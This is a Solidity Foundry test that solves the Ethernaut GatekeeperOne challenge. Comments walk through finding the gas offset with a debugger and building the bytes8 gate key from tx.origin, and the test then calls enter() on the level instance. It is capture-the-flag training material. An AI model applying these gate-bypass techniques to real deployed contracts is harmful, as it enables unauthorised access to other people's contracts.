// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level13 {
    function enter(bytes8) external returns (bool);
}

contract Level13Test is EthernautTest {
    function testLevel13() public {
        _createLevel("13");

        Level13 levelInstance13 = Level13(levelInstance["13"]);
        // Gate Two: gasleft() % 8191 == 0
        // For totalGas = 1,000,000, solve gas = 0
        // See what value the call fails with a large fixed gas value
        // Using foundry debugger with level13.sh
        // Stepping through to the call with REVERT
        // We can see the value of opcode GAS / 5A on the stack is 0x0f4146
        // 0x0f4146 = 999750
        // But, we need gasleft() % 8191 = 0
        // 999750 % 8191 = 448. We should now pass gate two with solveGas = 448
        uint256 solveGas = 448;
        uint256 totalGas = 1000000 - solveGas;
        // Gate key is 8 bytes long
        // First condition means that
        // XX XX XX XX XX XX XX XX needs to be modified to XX XX XX XX 00 00 FF FF
        // Second condition means that
        // XX XX XX XX 00 00 FF FF needs to be modified to SS SS SS SS 00 00 FF FF
        // Third condition means that
        // SS SS SS SS 00 00 FF FF needs to be modified to SS SS SS SS 00 00 TT TT
        // Where TT TT is the last 2 bytes of the tx.origin
        // This gives us a key of 0x1111111100000000 + uint16(uint160(tx.origin))
        bytes8 key = bytes8(uint64(0x1111111100000000) + uint64(uint16(uint160(address(this)))));
        console2.logAddress(tx.origin);
        // As if this test contract were actually calling as an EOA
        vm.prank(msg.sender, address(this));
        try levelInstance13.enter{gas: totalGas}(key) returns (bool) {
            console2.log("enter success");
        } catch (bytes memory reason) {
            revert("enter failed");
        }

        require(_submitLevel("13"));
    }
}
